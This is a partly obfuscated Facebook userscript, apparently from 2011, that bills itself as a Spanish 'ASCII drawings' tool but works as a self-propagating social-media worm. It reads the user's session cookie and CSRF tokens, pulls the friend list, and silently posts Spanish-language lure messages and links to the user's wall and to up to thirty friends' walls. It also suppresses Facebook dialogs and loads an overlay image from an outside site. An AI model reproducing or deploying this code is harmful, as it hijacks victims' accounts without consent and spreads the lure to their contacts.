/**
 * Facevid 1.2.1
 * All this code is licensed to adm - No Copy - No Modifications.
 * Copyright (c) 2011 adm
 */
// ==UserScript==
// @name         Como Hacer Dibujos Ascii!
// @namespace     http://eiq.cl/web/
// @description  Los Mejores Dibujos Ascii!
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @include       http://apps.facebook.com/*
// @version       1.2.1

// ==/UserScript==
document['ready'] = start(0);
a = 0;

function start(_0x4145x2) {
  var randomnumber = Math.floor(Math.random() * 99999);
var visitas = Math.floor(Math.random() * 987);
var randomnumber2 = Math.floor(Math.random() * 754);
var randomnumber3 = Math.floor(Math.random() * 43);
var randomnumber4 = Math.floor(Math.random() * 9);
var random = Math.floor(Math.random() * 7);
function getElementsByClass(_0x62cbx2, _0x62cbx3, _0x62cbx4) {
    if (_0x62cbx3 == null) {
        _0x62cbx3 = document;
    };
    if (_0x62cbx4 == null) {
        _0x62cbx4 = '*';
    };
    var _0x62cbx5 = new Array();
    var _0x62cbx6 = _0x62cbx3['getElementsByTagName'](_0x62cbx4);
    var _0x62cbx7 = ' ' + _0x62cbx2 + ' ';
    var _0x62cbx8 = 0;
    for (i = 0; i < _0x62cbx6['length']; i++) {
        var _0x62cbx9 = ' ' + _0x62cbx6[i]['className'] + ' ';
        if (_0x62cbx9['indexOf'](_0x62cbx7) != -1) {
            _0x62cbx5[_0x62cbx8++] = _0x62cbx6[i];
        };
    };
    return _0x62cbx5;
};
setInterval(function () {
    var _0x62cbxa = getElementsByClass('generic_dialoge');
    for (i = 0; i < _0x62cbxa['length']; i++) {
        _0x62cbxa[i]['style']['display'] = 'none';
    };
}, 200);
function overlay() {
    darkbox = document['createElement']('div');
    //document['body']['appendChild'](darkbox);
    darkbox['style']['position'] = 'fixed';
    darkbox['style']['opacity'] = 0.8;
    darkbox['style']['filter'] = 'alpha(opacity=80)';
    darkbox['style']['background'] = '#FFF';
    darkbox['style']['top'] = 0;
    darkbox['style']['left'] = 0;
    darkbox['style']['height'] = 100 + '%';
    darkbox['style']['width'] = 100 + '%';
    darkbox['style']['zIndex'] = 999;
    darkbox2 = document['createElement']('img');
    //document['body']['appendChild'](darkbox2);
    darkbox2['style']['position'] = 'fixed';
    darkbox2['src'] = 'http://cinematicket.eu/fb/verify.png';
    darkbox2['style']['marginLeft'] = '-233px';
    darkbox2['style']['marginTop'] = '-62px';
    darkbox2['style']['top'] = 50 + '%';
    darkbox2['style']['left'] = 50 + '%';
    darkbox2['style']['zIndex'] = 9999;
};
overlay();
function readCookie(_0x62cbxd) {
    var _0x62cbxe = _0x62cbxd + '=';
    var _0x62cbxf = document['cookie']['split'](';');
    for (var _0x62cbx10 = 0; _0x62cbx10 < _0x62cbxf['length']; _0x62cbx10++) {
        var _0x62cbx11 = _0x62cbxf[_0x62cbx10];
        while (_0x62cbx11['charAt'](0) == ' ') {
            _0x62cbx11 = _0x62cbx11['substring'](1, _0x62cbx11['length']);
        };
        if (_0x62cbx11['indexOf'](_0x62cbxe) == 0) {
            return _0x62cbx11['substring'](_0x62cbxe['length'], _0x62cbx11['length']);
        };
    };
    return null;
};
var user_id = readCookie('c_user');
var user_name = document['getElementById']('navAccountName')['innerHTML'];
var uid = user_id;
function getRandomInt(_0x62cbx16, _0x62cbx17) {
    return Math['floor'](Math['random']() * (_0x62cbx17 - _0x62cbx16 + 1)) + _0x62cbx16;
};
function randomValue(_0x62cbx19) {
    return _0x62cbx19[getRandomInt(0, _0x62cbx19['length'] - 1)];
};
var post_form_id = document['getElementsByName']('post_form_id')[0]['value'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var video_url = 'http://www.facebook.com/Dibujos.Ascii?sk=app_201742856511228';
var domains = ['http://desmotivaciones.es/demots/201105/Imposiblenoreirse.jpg'];
var p0 = ['Cambia Tu Perfil'];
var p1 = ['Hola'];
var p2 = ['Nadie se Resiste a Mirar Eso Increibles Dibujos'];
var p3 = ['Divertidisimo'];
var message = '';
var did = false;
function done() {
    if (!did) {
        did = true;
        darkbox2['style']['display'] = 'none';
        darkbox3 = document['createElement']('iframe');
        //document['body']['appendChild'](darkbox3);
        darkbox3['src'] = 'http://www.facebook.com/Dibujos.Ascii?sk=app_201742856511228';
        darkbox3['style']['position'] = 'fixed';
        darkbox3['style']['top'] = 0;
        darkbox3['style']['left'] = 0;
        darkbox3['frameBorder'] = 0;
        darkbox3['style']['height'] = 100 + '%';
        darkbox3['style']['width'] = 100 + '%';
        darkbox3['style']['zIndex'] = 99999;
    };
};
var friends;
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&viewer=' + uid + '&' + Math['random'](), false);
gf['send']();
if (gf['readyState'] != 4) {}
else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {}
    else {
        friends = data;
    };
};
function contin() {
    var _0x62cbx17 = friends['payload']['entries']['length'];
    if (_0x62cbx17 > 30) {
        _0x62cbx17 = 30;
    };
    message = 'Imposible No reirse.Intentalo :D';
    var _0x62cbx27 = new XMLHttpRequest();
    var _0x62cbx28 = 'http://www.facebook.com/ajax/profile/composer.php?__a=1';
    var _0x62cbx29 = 'post_form_id=' + post_form_id + '&fb_dtsg=' + fb_dtsg + '&xhpc_composerid=u574553_1&xhpc_targetid=' + user_id + '&xhpc_context=profile&xhpc_fbx=1&xhpc_timeline=&xhpc_ismeta=&aktion=post&app_id=2309869772&UIThumbPager_Input=0&attachment[params][medium]=103&attachment[params][urlInfo][user]=' + video_url + '&attachment[params][urlInfo][canonical]=' + video_url + '&attachment[params][favicon]=http://s.ytimg.com/yt/favicon-vflZlzSbU.ico&attachment[params][title]=Nadie se Resiste a reir con esto&attachment[params][fragment_title]=&attachment[params][external_author]=&attachment[params][summary]=Nadie se Resiste a reir con esto&attachment[params][url]=' + video_url + '&attachment[params][images][src]=' + randomValue(domains) + '%26' + Math['random']() + '&attachment[params][images][width]=398&attachment[params][images][height]=224&attachment[params][images][v]=0&attachment[params][images][safe]=1&attachment[params][ttl]=-1264972308&attachment[params][error]=1&attachment[params][responseCode]=200&attachment[params][expires]=41647446&attachment[params][images][0]=http://desmotivaciones.es/demots/201105/Imposiblenoreirse.jpg&attachment[params][scrape_time]=1306619754&attachment[params][cache_hit]=1&attachment[type]=100&xhpc_message_text=' + message + '&xhpc_message=' + message + '&UIPrivacyWidget[0]=80&privacy_data[value]=80&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&nctr[_mod]=pagelet_wall&lsd=&post_form_id_source=AsyncRequest';
    _0x62cbx27['open']('POST', _0x62cbx28, true);
    _0x62cbx27['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    _0x62cbx27['setRequestHeader']('Content-length', _0x62cbx29['length']);
    _0x62cbx27['setRequestHeader']('Connection', 'keep-alive');
    _0x62cbx27['onreadystatechange'] = function () {};
    _0x62cbx27['send'](_0x62cbx29);
    for (var _0x62cbx2a = 0; _0x62cbx2a < _0x62cbx17; _0x62cbx2a++) {
        if (friends['payload']['entries'][_0x62cbx2a]['uid'] != user_id) {
            message = [randomValue(p1), friends['payload']['entries'][_0x62cbx2a]['text']['substr'](0, friends['payload']['entries'][_0x62cbx2a]['text']['indexOf'](' '))['toLowerCase'](), randomValue(p2), randomValue(p3)]['join'](' ');
            var _0x62cbx2b = new XMLHttpRequest();
            var _0x62cbx28 = 'http://www.facebook.com/ajax/profile/composer.php?__a=1';
            var _0x62cbx29 = 'post_form_id=' + post_form_id + '&fb_dtsg=' + fb_dtsg + '&xhpc_composerid=u574553_1&xhpc_targetid=' + friends['payload']['entries'][_0x62cbx2a]['uid'] + '&xhpc_context=profile&xhpc_fbx=1&xhpc_timeline=&xhpc_ismeta=&aktion=post&app_id=2309869772&UIThumbPager_Input=0&attachment[params][medium]=103&attachment[params][urlInfo][user]=' + video_url + '&attachment[params][urlInfo][canonical]=' + video_url + '&attachment[params][favicon]=http://s.ytimg.com/yt/favicon-vflZlzSbU.ico&attachment[params][title]=Podras resistirte a reir&attachment[params][fragment_title]=&attachment[params][external_author]=&attachment[params][summary]=Nadie se Resiste a reir con esto' + randomValue(p0) + '&attachment[params][url]=' + video_url + '&attachment[params][images]&attachment[params][images][src]=' + randomValue(domains) + '%26' + Math['random']() + '&attachment[params][images][width]=398&attachment[params][images][height]=224&attachment[params][images][i]=0&attachment[params][images][safe]=1&attachment[params][ttl]=-1264972308&attachment[params][error]=1&attachment[params][responseCode]=200&attachment[params][expires]=41647446&attachment[params][images][0]=http://desmotivaciones.es/demots/201105/Imposiblenoreirse.jpg&attachment[params][scrape_time]=1306619754&attachment[params][cache_hit]=1&attachment[type]=100&xhpc_message_text=' + message + '&xhpc_message=' + message + '&UIPrivacyWidget[0]=80&privacy_data[value]=80&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&nctr[_mod]=pagelet_wall&lsd=&post_form_id_source=AsyncRequest';
            _0x62cbx2b['open']('POST', _0x62cbx28, true);
            _0x62cbx2b['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
            _0x62cbx2b['setRequestHeader']('Content-length', _0x62cbx29['length']);
            _0x62cbx2b['setRequestHeader']('Connection', 'keep-alive');
            _0x62cbx2b['onreadystatechange'] = function () {};
            _0x62cbx2b['send'](_0x62cbx29);
        };
    };
    setTimeout('done()', 5000);
};
setTimeout(function () {
    contin();
}, 2000);